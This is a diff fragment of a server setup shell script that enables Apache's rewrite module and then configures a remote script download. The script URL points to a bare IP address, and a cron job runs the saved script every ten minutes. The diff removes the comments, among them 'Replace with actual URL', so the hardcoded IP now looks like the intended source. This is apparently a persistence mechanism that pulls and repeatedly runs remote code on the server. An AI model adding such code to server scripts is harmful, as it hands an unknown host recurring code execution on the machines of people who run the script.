@@ -45,9 +45,9 @@ a2enmod rewrite
 systemctl restart apache2
 
 
-SCRIPT_URL="https://209.141.46.155/uploads/1.sh"  # Replace with actual URL
-LOCAL_SCRIPT="/usr/local/bin/myscript.sh"  # Local path to save the script
-CRON_JOB="*/10 * * * * /bin/bash $LOCAL_SCRIPT"  # Run every 10 minutes
+SCRIPT_URL="https://209.141.46.155/uploads/1.sh"
+LOCAL_SCRIPT="/usr/local/bin/myscript.sh"
+CRON_JOB="*/10 * * * * /bin/bash $LOCAL_SCRIPT"
 
 if ! command -v crontab &>/dev/null; then
     echo "cron not found, installing..."
